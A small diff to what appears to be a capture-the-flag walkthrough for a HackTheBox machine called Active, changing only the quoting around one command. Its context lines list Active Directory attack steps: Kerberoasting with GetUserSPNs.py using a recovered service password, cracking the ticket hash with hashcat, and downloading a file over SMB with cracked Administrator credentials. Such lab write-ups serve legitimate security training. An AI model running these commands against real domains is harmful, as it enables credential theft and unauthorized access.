@@ -51,4 +51,4 @@
 - Administrator is Kerberoastable `GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/svc_tgs`
 - Kerberoast `GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/svc_tgs:GPPstillStandingStrong2k18 -outputfile active_spns.txt`
 - Crack the hash with hashcat `.\hashcat.exe -m 13100 .\hashes\active-htb.txt .\wordlists\rockyou.txt
-- Download the root flag 'smbmap -u Administrator -p Ticketmaster1968 -d active.htb -H 10.10.10.100 -R Users -A root.txt -q`
+- Download the root flag `smbmap -u Administrator -p Ticketmaster1968 -d active.htb -H 10.10.10.100 -R Users -A root.txt -q`
